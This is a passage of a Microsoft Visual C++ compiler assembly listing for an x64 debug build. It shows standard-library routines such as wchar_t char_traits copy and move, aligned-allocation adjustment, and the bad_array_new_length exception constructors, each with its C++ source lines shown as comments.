  0002e	5f		 pop	 rdi
  0002f	5d		 pop	 rbp
  00030	c3		 ret	 0
?_Xlen_string@std@@YAXXZ ENDP				; std::_Xlen_string
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
_TEXT	SEGMENT
_Left$ = 224
_Right$ = 232
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z PROC	; std::_WChar_traits<wchar_t>::assign, COMDAT

; 294  :     static _CONSTEXPR17 void assign(_Elem& _Left, const _Elem& _Right) noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 295  : #if _HAS_CXX20
; 296  :         if (_STD is_constant_evaluated()) {
; 297  :             return _Primary_char_traits::assign(_Left, _Right);
; 298  :         }
; 299  : #endif // _HAS_CXX20
; 300  :         _Left = _Right;

  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  0002b	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00032	0f b7 09	 movzx	 ecx, WORD PTR [rcx]
  00035	66 89 08	 mov	 WORD PTR [rax], cx

; 301  :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 224
_First2$ = 232
_Count$ = 240
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::move, COMDAT

; 79   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         // copy [_First2, _First2 + _Count) to [_First1, ...), allowing overlap
; 81   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 82   :         __builtin_memmove(_First1, _First2, _Count * sizeof(_Elem));
; 83   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 84   : #if _HAS_CXX20
; 85   :         if (_STD is_constant_evaluated()) {
; 86   :             // dest: [_First1, _First1 + _Count)
; 87   :             // src: [_First2, _First2 + _Count)
; 88   :             // We need to handle overlapping ranges.
; 89   :             // If _First1 is in the src range, we need a backward loop.
; 90   :             // Otherwise, the forward loop works (even if the back of dest overlaps the front of src).
; 91   : 
; 92   :             // Usually, we would compare pointers with less-than, even though they could belong to different arrays.
; 93   :             // However, we're not allowed to do that during constant evaluation, so we need a linear scan for equality.
; 94   :             bool _Loop_forward = true;
; 95   : 
; 96   :             for (const _Elem* _Src = _First2; _Src != _First2 + _Count; ++_Src) {
; 97   :                 if (_First1 == _Src) {
; 98   :                     _Loop_forward = false;
; 99   :                     break;
; 100  :                 }
; 101  :             }
; 102  : 
; 103  :             if (_Loop_forward) {
; 104  :                 for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 105  :                     _First1[_Idx] = _First2[_Idx];
; 106  :                 }
; 107  :             } else {
; 108  :                 for (size_t _Idx = _Count; _Idx != 0; --_Idx) {
; 109  :                     _First1[_Idx - 1] = _First2[_Idx - 1];
; 110  :                 }
; 111  :             }
; 112  : 
; 113  :             return _First1;
; 114  :         }
; 115  : #endif // _HAS_CXX20
; 116  : 
; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _First2$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First1$[rbp]
  00044	e8 00 00 00 00	 call	 memmove

; 118  : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 119  : 
; 120  :         return _First1;

  00049	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _First1$[rbp]

; 121  :     }

  00050	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00057	5f		 pop	 rdi
  00058	5d		 pop	 rbp
  00059	c3		 ret	 0
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::move
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 224
_First2$ = 232
_Count$ = 240
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::copy, COMDAT

; 48   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 49   :         // copy [_First2, _First2 + _Count) to [_First1, ...)
; 50   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 51   :         __builtin_memcpy(_First1, _First2, _Count * sizeof(_Elem));
; 52   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 53   : #if _HAS_CXX20
; 54   :         if (_STD is_constant_evaluated()) {
; 55   :             // pre: [_First1, _First1 + _Count) and [_First2, _First2 + _Count) do not overlap
; 56   :             for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 57   :                 _First1[_Idx] = _First2[_Idx];
; 58   :             }
; 59   : 
; 60   :             return _First1;
; 61   :         }
; 62   : #endif // _HAS_CXX20
; 63   : 
; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _First2$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First1$[rbp]
  00044	e8 00 00 00 00	 call	 memcpy

; 65   : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 66   : 
; 67   :         return _First1;

  00049	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _First1$[rbp]

; 68   :     }

  00050	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00057	5f		 pop	 rdi
  00058	5d		 pop	 rbp
  00059	c3		 ret	 0
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::copy
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ PROC	; std::_Fake_proxy_ptr_impl::_Release, COMDAT

; 1445 :     _CONSTEXPR20 void _Release() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ENDP	; std::_Fake_proxy_ptr_impl::_Release
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
__formal$ = 240
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z PROC ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl, COMDAT

; 1442 :     _CONSTEXPR20 _Fake_proxy_ptr_impl(const _Fake_allocator&, const _Container_base0&) noexcept {}

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00029	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00037	5f		 pop	 rdi
  00038	5d		 pop	 rbp
  00039	c3		 ret	 0
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ENDP ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z PROC ; std::_Container_base0::_Alloc_proxy, COMDAT

; 1178 :     _CONSTEXPR20 void _Alloc_proxy(const _Fake_allocator&) noexcept {}

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002b	5f		 pop	 rdi
  0002c	5d		 pop	 rbp
  0002d	c3		 ret	 0
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ENDP ; std::_Container_base0::_Alloc_proxy
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Orphan_all@_Container_base0@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Orphan_all@_Container_base0@std@@QEAAXXZ PROC		; std::_Container_base0::_Orphan_all, COMDAT

; 1176 :     _CONSTEXPR20 void _Orphan_all() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Orphan_all@_Container_base0@std@@QEAAXXZ ENDP		; std::_Container_base0::_Orphan_all
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
_TEXT	SEGMENT
_Ptr_user$ = 8
_Ptr_container$ = 40
_Min_back_shift$ = 72
_Back_shift$ = 104
_Ptr$ = 352
_Bytes$ = 360
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z PROC ; std::_Adjust_manually_vector_aligned, COMDAT

; 158  : inline void _Adjust_manually_vector_aligned(void*& _Ptr, size_t& _Bytes) {

$LN11:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 68 01
	00 00		 sub	 rsp, 360		; 00000168H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 159  :     // adjust parameters from _Allocate_manually_vector_aligned to pass to operator delete
; 160  :     _Bytes += _Non_user_size;

  00024	48 8b 85 68 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  0002b	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0002e	48 83 c0 27	 add	 rax, 39			; 00000027H
  00032	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00039	48 89 01	 mov	 QWORD PTR [rcx], rax

; 161  : 
; 162  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);

  0003c	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  00043	48 8b 00	 mov	 rax, QWORD PTR [rax]
  00046	48 89 45 08	 mov	 QWORD PTR _Ptr_user$[rbp], rax

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0004a	b8 08 00 00 00	 mov	 eax, 8
  0004f	48 6b c0 ff	 imul	 rax, rax, -1
  00053	48 8b 4d 08	 mov	 rcx, QWORD PTR _Ptr_user$[rbp]
  00057	48 8b 04 01	 mov	 rax, QWORD PTR [rcx+rax]
  0005b	48 89 45 28	 mov	 QWORD PTR _Ptr_container$[rbp], rax

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);

  0005f	48 c7 45 48 08
	00 00 00	 mov	 QWORD PTR _Min_back_shift$[rbp], 8

; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00067	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  0006e	48 8b 4d 28	 mov	 rcx, QWORD PTR _Ptr_container$[rbp]
  00072	48 8b 00	 mov	 rax, QWORD PTR [rax]
  00075	48 2b c1	 sub	 rax, rcx
  00078	48 89 45 68	 mov	 QWORD PTR _Back_shift$[rbp], rax
$LN4@Adjust_man:

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0007c	48 83 7d 68 08	 cmp	 QWORD PTR _Back_shift$[rbp], 8
  00081	72 09		 jb	 SHORT $LN8@Adjust_man
  00083	48 83 7d 68 27	 cmp	 QWORD PTR _Back_shift$[rbp], 39 ; 00000027H
  00088	77 02		 ja	 SHORT $LN8@Adjust_man
  0008a	eb 0b		 jmp	 SHORT $LN9@Adjust_man
$LN8@Adjust_man:
$LN7@Adjust_man:
  0008c	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00091	33 c0		 xor	 eax, eax
  00093	85 c0		 test	 eax, eax
  00095	75 f5		 jne	 SHORT $LN7@Adjust_man
$LN9@Adjust_man:
  00097	33 c0		 xor	 eax, eax
  00099	85 c0		 test	 eax, eax
  0009b	75 df		 jne	 SHORT $LN4@Adjust_man

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0009d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  000a4	48 8b 4d 28	 mov	 rcx, QWORD PTR _Ptr_container$[rbp]
  000a8	48 89 08	 mov	 QWORD PTR [rax], rcx
$LN10@Adjust_man:

; 179  : }

  000ab	48 8d a5 48 01
	00 00		 lea	 rsp, QWORD PTR [rbp+328]
  000b2	5f		 pop	 rdi
  000b3	5d		 pop	 rbp
  000b4	c3		 ret	 0
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ENDP ; std::_Adjust_manually_vector_aligned
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 224
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z PROC ; std::_Default_allocate_traits::_Allocate, COMDAT

; 89   :         void* _Allocate(const size_t _Bytes) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 90   :         return ::operator new(_Bytes);

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00026	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 91   :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ENDP ; std::_Default_allocate_traits::_Allocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Throw_bad_array_new_length@std@@YAXXZ
_TEXT	SEGMENT
$T1 = 200
?_Throw_bad_array_new_length@std@@YAXXZ PROC		; std::_Throw_bad_array_new_length, COMDAT

; 63   : [[noreturn]] inline void _Throw_bad_array_new_length() {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 64   :     _THROW(bad_array_new_length{});

  0001b	48 8d 8d c8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00022	e8 00 00 00 00	 call	 ??0bad_array_new_length@std@@QEAA@XZ ; std::bad_array_new_length::bad_array_new_length
  00027	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:_TI3?AVbad_array_new_length@std@@
  0002e	48 8d 8d c8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00035	e8 00 00 00 00	 call	 _CxxThrowException
$LN2@Throw_bad_:

; 65   : }

  0003a	48 8d a5 f8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+248]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?_Throw_bad_array_new_length@std@@YAXXZ ENDP		; std::_Throw_bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gbad_array_new_length@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gbad_array_new_length@std@@UEAAPEAXI@Z PROC		; std::bad_array_new_length::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1bad_array_new_length@std@@UEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gbad_array_new_length@std@@UEAAPEAXI@Z ENDP		; std::bad_array_new_length::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
__that$ = 232
??0bad_array_new_length@std@@QEAA@AEBV01@@Z PROC	; std::bad_array_new_length::bad_array_new_length, COMDAT
$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR __that$[rbp]
  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ??0bad_alloc@std@@QEAA@AEBV01@@Z
  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00039	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@AEBV01@@Z ENDP	; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1bad_array_new_length@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1bad_array_new_length@std@@UEAA@XZ PROC		; std::bad_array_new_length::~bad_array_new_length, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001a	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UEAA@XZ
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1bad_array_new_length@std@@UEAA@XZ ENDP		; std::bad_array_new_length::~bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_array_new_length@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0bad_array_new_length@std@@QEAA@XZ PROC		; std::bad_array_new_length::bad_array_new_length, COMDAT

; 141  :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 140  :         : bad_alloc("bad array new length")

  0001f	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
  00026	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002d	e8 00 00 00 00	 call	 ??0bad_alloc@std@@AEAA@QEBD@Z ; std::bad_alloc::bad_alloc

; 141  :     {

  00032	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00039	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00040	48 89 08	 mov	 QWORD PTR [rax], rcx

; 142  :     }

  00043	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0004a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@XZ ENDP		; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
